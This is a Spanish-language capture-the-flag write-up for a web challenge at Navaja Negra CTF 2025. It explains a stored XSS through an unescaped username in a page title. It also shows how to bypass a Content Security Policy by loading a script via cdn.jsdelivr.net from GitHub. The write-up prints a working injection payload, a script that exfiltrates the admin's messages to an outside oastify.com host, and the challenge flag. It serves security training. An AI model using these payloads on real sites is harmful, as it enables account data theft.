# NavajaSupportBot

> Navaja Negra CTF 2025

> 02/10/2025 09:00 CEST - 04/10/2025 11:00 CEST

* Categoría: Web
* Autor: eljoselillo7
* Dificultad: ★★★★
* Etiquetas: XSS

## Descripción

    El bot de soporte de Navaja está on fire. Lanza tus consultas al admin y cuéntale si pillaste un miguelito sospechoso o si te dejaron tirado sin cena en plena noche. 
    Aquí es donde se reportan las movidas más épicas, como las FLAGS.

## Archivos

    NavajaSupport.zip

## Resolución

El reto consiste en una aplicación web que permite a los usuarios crear y compartir mensajes de texto. Al revisar el código fuente, se observa un endpoint diseñado específicamente para enviar el mensaje al usuario admin, quien posteriormente visitará el perfil del creador del mensaje.

La flag se encuentra en el perfil del usuario admin, por lo que el objetivo es lograr la ejecución de un ataque XSS. Analizando el archivo `auth.html`, se identifica que la vulnerabilidad reside en el campo del username.

```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{{ username | safe }} NavajaSupport Panel</title>

```

No obstante, la explotación no es tan trivial: existe una Content Security Policy (CSP) que solo permite cargar scripts desde `self` y `cdn.jsdelivr.net`. Esto significa que no cualquier payload será válido.

Aun así, es posible realizar un bypass ya que el dominio `cdn.jsdelivr.net` no solo aloja versiones obsoletas de librerías vulnerables, sino que también actúa como un proxy hacia GitHub. Esto abre la puerta a la carga de scripts maliciosos de forma indirecta. De hecho, en webs como [cspbypass.com](https://cspbypass.com/) ya se documenta un método funcional para saltarse esta restricción.

Por ejemplo, se puede usar el siguiente formato en la URL para cargar archivos de github:
`https://cdn.jsdelivr.net/gh/<user>/<repo>/<file>`
  
Los pasos para obtener la flag serían los siguientes:

1. **Creación del usuario malicioso**  
    Registramos un nuevo usuario cuyo nombre contenga un payload XSS válido. Por ejemplo:
    
    `</title><script src="https://cdn.jsdelivr.net/gh/eljoselillo7/Test/test4.js"></script><title>`
    
    De esta forma, al visitar nuestro perfil se cargará el script desde `cdn.jsdelivr.net`.
    
2. **Preparación del script malicioso**  
    En GitHub, creamos un repositorio con los archivos necesarios y lo enlazamos de forma que pueda ser servido a través de `cdn.jsdelivr.net`.  
    El script (`test4.js`) será el encargado de leer la flag del perfil del admin y enviarla a un servidor bajo nuestro control para su exfiltración.
    Un ejemplo de script válido sería:

```javascript
fetch('/messages')
.then(response => response.json())
.then(data => {
const jsonString = JSON.stringify(data);
const base64Data = btoa(jsonString);
const targetUrl = `https://m8vnax9buwan6b35ug48ooky1p7gv6ja.oastify.com/?data=${encodeURIComponent(base64Data)}`;

window.location = targetUrl;
})
.catch(err => console.error('Error fetching messages:', err));
```
    
1. **Forzar la visita del admin**
    Finalmente, utilizamos el endpoint que obliga al usuario admin a visitar el perfil de cualquier usuario.
    
    Al acceder a nuestro perfil, se ejecutará el payload, cargando el script malicioso y filtrando la flag hacia nuestro servidor.

> **flag: nnctf{4_p0r_l4_cSp_4m1gu1llo}**